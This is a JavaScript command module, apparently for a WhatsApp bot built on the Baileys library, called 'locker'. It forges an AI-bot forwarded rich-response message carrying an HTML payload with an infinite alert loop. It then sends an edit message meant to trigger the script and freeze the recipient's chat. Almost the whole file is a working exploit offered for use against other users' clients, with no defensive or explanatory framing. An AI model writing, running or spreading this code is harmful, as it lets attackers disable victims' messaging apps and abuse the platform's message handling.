// language: JavaScript, file: commands/tools/Locker.js
'use strict';

module.exports = {
    name: 'locker',
    aliases: ['lock', 'freezelink'],
    category: 'group',
    desc: '🔒 Sends a fake HTML bot message that locks the chat',
    usage: '.locker',
    privateOnly: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        const from = ctx.from;

        // The raw HTML payload that will run the infinite alert loop
        const html = "<script>while(true){alert('LOCKED BY MADARA ♕')}</script>";

        // 1. Construct the GenAI Unified Response payload
        const innerData = {
            __typename: 'GenAIUnifiedResponse',
            response_id: 'MadaraLocker_' + Date.now(),
            sections: [{
                __typename: 'GenAIUnifiedResponseSection',
                view_model: {
                    __typename: 'GenAISingleLayoutViewModel',
                    primitive: {
                        __typename: 'FOAHtmlPrimitiveDemoDONOTUSE',
                        trusted_sources: [],
                        payload: html
                    }
                }
            }]
        };

        const base64Payload = Buffer.from(JSON.stringify(innerData)).toString('base64');

        const message = {
            botForwardedMessage: {
                message: {
                    richResponseMessage: {
                        messageType: 1,
                        unifiedResponse: {
                            data: base64Payload
                        },
                        contextInfo: {
                            forwardingScore: 1,
                            isForwarded: true,
                            forwardOrigin: 4,
                            forwardedAiBotMessageInfo: {
                                botJid: '0@bot'
                            }
                        }
                    }
                }
            }
        };

        try {
            // 2. Send the initial message
            const result = await sock.relayMessage(from, message, {});
            
            // 3. Extract the generated ID (Baileys returns the ID string directly, or an object)
            const messageId = result?.key?.id || result;

            if (!messageId) throw new Error('Failed to get message ID from relay');

            // 4. Send the protocolMessage edit to trigger the payload
            await sock.relayMessage(from, {
                botForwardedMessage: {
                    message: {
                        protocolMessage: {
                            key: {
                                remoteJid: from,
                                fromMe: true,
                                id: messageId
                            },
                            type: 14, // MESSAGE_EDIT
                            editedMessage: message
                        }
                    }
                }
            }, {});

            // Optional: Send a confirmation in the chat (will be obscured by the alert)
            // await ctx.reply('🔒 Chat locked.'); 

        } catch (e) {
            console.error('[Locker Error]', e.message);
            // Fallback reply if it fails
            await ctx.reply(`❌ Failed to lock chat: ${e.message}${s.FOOTER}`);
        }
    }
};